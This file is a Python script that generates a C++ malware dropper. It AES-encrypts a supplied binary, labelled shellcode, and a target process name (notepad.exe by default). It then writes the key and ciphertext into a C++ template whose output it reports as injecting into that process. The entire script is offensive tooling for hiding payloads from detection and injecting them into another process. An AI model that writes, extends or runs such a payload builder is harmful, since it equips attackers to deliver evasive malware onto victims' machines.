#!/usr/bin/python3
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import hashlib
import os
from colorama import Fore

def printS(text):
    print(f"""{Fore.GREEN}[+]{Fore.WHITE} {text}""")
def printE(text):
    print(f"""{Fore.RED}[!]{Fore.WHITE} {text}""")
def printI(text):
    print(f"""{Fore.BLUE}[*]{Fore.WHITE} {text}""")

defaultProcessName = r"""c:\windows\system32\notepad.exe"""

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} binaryName processName(default: {defaultProcessName})")
    sys.exit(1)

binaryName = sys.argv[1]
printI(f"Generating C++ Dropper for {binaryName}")

if len(sys.argv) > 2:
    processName = sys.argv[2]
else:
    processName = defaultProcessName
    printI("No process Specified. Using default process.")
	
printI(f"Injecting into {processName}")

def writeToFile(mark, data, i):
    # i is number of lines after mark. Starts from 0!
    line = True
    lineCount = 1
    with open("sources/code.cpp","r") as code:
        while line:
            line = code.readline()
            if mark in line:
                break
            lineCount += 1

    targetLine = lineCount
    with open("sources/code.cpp", "r") as a_file:
        list_of_lines = a_file.readlines()
        list_of_lines[targetLine + i] = f"        {data}\n"

    with open("sources/code.cpp", "w") as a_file:
        a_file.writelines(list_of_lines)

def encrypt(plaintext):
    KEY = get_random_bytes(16)
    iv = 16 * b'\x00'
    cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

    #key = 'char key[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };'
    #payload = 'unsigned char payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };'
    
    key = '{ 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };'
    payload = '{ 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };'
    
    return key, payload



# Encrypting provided binary
binaryData = open(binaryName, "rb").read()
binaryKey, binaryPayload = encrypt(binaryData)
writeToFile("Insert Shellcode Here", rf"// {binaryName}", 0)
writeToFile("Insert Shellcode Here", f"char key[] = {binaryKey}", 1)
writeToFile("Insert Shellcode Here", f"unsigned char payload[] = {binaryPayload}", 2)
    

# Encrypting provided process name
processKey, processEncName = encrypt(processName.encode())
writeToFile("Insert Process name here", rf"// {processName}", 0)
writeToFile("Insert Process name here", f"char key[] = {processKey}", 1)
writeToFile("Insert Process name here", f"unsigned char processName[] = {processEncName}", 2)


os.system(f"cp sources/code.cpp output/{binaryName}.cpp")
os.system("cp sources/code.cpp.bak sources/code.cpp")
printS(f"Output saved to output/{binaryName}.cpp")
